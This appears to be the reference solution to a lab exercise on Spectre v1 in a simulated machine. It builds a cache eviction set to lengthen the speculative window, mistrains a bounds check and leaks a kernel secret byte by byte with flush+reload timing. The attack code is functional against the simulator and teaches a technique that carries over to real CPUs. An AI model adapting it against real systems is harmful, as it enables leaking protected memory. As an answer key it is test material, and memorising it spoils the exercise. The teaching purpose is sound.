"""Part 3 -- Spectre v1 with a short window (REFERENCE SOLUTION: spoilers!).

SYS_V1_HARD no longer flushes its bound, so after training v1h_limit sits in L1
and the branch resolves in ~5 cycles, while the gadget needs ~50 cycles (slow
index computation) before it can transmit.  User code cannot clflush a kernel
line, so we evict v1h_limit with ordinary loads: an eviction set of user lines
that map to the same L2 set.  L2 is inclusive, so this also removes it from L1,
and the next bounds check has to go to DRAM (~150 cycles): a long window again.
"""

TRAIN_CALLS = 6
ATTEMPTS = 8
EVSET_MAX = 64

ATTACK_SRC = f"""
.data
.align 64
times:  .zero 2048
evset:  .zero {8 * EVSET_MAX}       # eviction-set addresses, written from Python
.text
_start:                             # a0 = malicious x, a1 = in-bounds x, a2 = #train, a3 = #evset
    mv      s5, a0
    mv      s6, a1
    mv      s7, a2
    mv      s8, a3
train:
    mv      a0, s6
    li      a7, SYS_V1_HARD
    syscall
    addi    s7, s7, -1
    bnez    s7, train
    li      s0, PROBE_BASE
    li      s1, PROBE_ENTRIES
flush:
    clflush 0(s0)
    addi    s0, s0, PROBE_STRIDE
    addi    s1, s1, -1
    bnez    s1, flush
    # evict v1h_limit: touch every line of the eviction set (after training,
    # which brought the bound back into L1)
    la      s0, evset
    mv      s1, s8
evict:
    ld      t0, 0(s0)
    lb      t1, 0(t0)
    addi    s0, s0, 8
    addi    s1, s1, -1
    bnez    s1, evict
    mv      a0, s5
    li      a7, SYS_V1_HARD
    syscall
    li      s0, PROBE_BASE
    la      s2, times
    li      s1, PROBE_ENTRIES
reload:
    rdcycle t1
    lb      t0, 0(s0)
    rdcycle t2
    sub     t2, t2, t1
    sd      t2, 0(s2)
    addi    s0, s0, PROBE_STRIDE
    addi    s2, s2, 8
    addi    s1, s1, -1
    bnez    s1, reload
    halt
"""

CALIBRATE_SRC = """
.data
.align 64
x:  .zero 64
.text
_start:
    la      s0, x
    lb      t0, 0(s0)
    rdcycle t1
    lb      t0, 0(s0)
    rdcycle t2
    sub     s2, t2, t1
    clflush 0(s0)
    rdcycle t1
    lb      t0, 0(s0)
    rdcycle t2
    sub     s3, t2, t1
    halt
"""


def threshold(m):
    thr = m.user.get("threshold")
    if thr is None:
        prog = m.load(CALIBRATE_SRC)
        hits, misses = [], []
        for _ in range(16):
            r = m.run(prog)
            hits.append(r["s2"])
            misses.append(r["s3"])
        thr = m.user["threshold"] = (sorted(hits)[8] + sorted(misses)[8]) // 2
    return thr


# ---------------------------------------------------------------------------
# Exercise 3-1
# ---------------------------------------------------------------------------
def eviction_set(m, target):
    """User addresses whose accesses evict `target` from L1 and L2.

    L2 set index = (addr >> 6) & (l2_sets - 1): two addresses share an L2 set iff
    they are congruent modulo l2_sets * 64 = 128 KiB.  (They then also share an
    L1 set, since L1 uses a subset of the same index bits.)  With LRU, touching
    l2_ways distinct congruent lines evicts everything else from the set; we add
    a few spares.  The HEAP is free user memory, and it does not overlap the
    probe array, so the eviction set never disturbs the probe slots."""
    g = m.geometry
    stride = g["l2_sets"] * g["line"]
    first = m.HEAP_BASE + (target - m.HEAP_BASE) % stride
    n = g["l2_ways"] + 4
    ev = [first + k * stride for k in range(n)]
    assert ev[-1] + g["line"] <= m.HEAP_END
    return ev


# ---------------------------------------------------------------------------
# Exercise 3-2
# ---------------------------------------------------------------------------
def leak_byte(m, i):
    """Return secret3[i]."""
    thr = threshold(m)
    prog = m.load(ATTACK_SRC)
    ev = m.user.get("evset")
    if ev is None:
        ev = m.user["evset"] = eviction_set(m, m.ksyms["k_v1h_limit"])
        m.write_u64s(prog["evset"], ev)
    x = m.ksyms["k_secret3"] - m.ksyms["k_v1h_array"] + i
    times = None
    for _attempt in range(ATTEMPTS):
        m.run(prog, a0=x, a1=i % 16, a2=TRAIN_CALLS, a3=len(ev))
        times = m.read_u64s(prog["times"], 256)
        hits = [b for b in range(256) if times[b] < thr]
        if len(hits) == 1:
            return hits[0]
    return min(range(256), key=times.__getitem__)
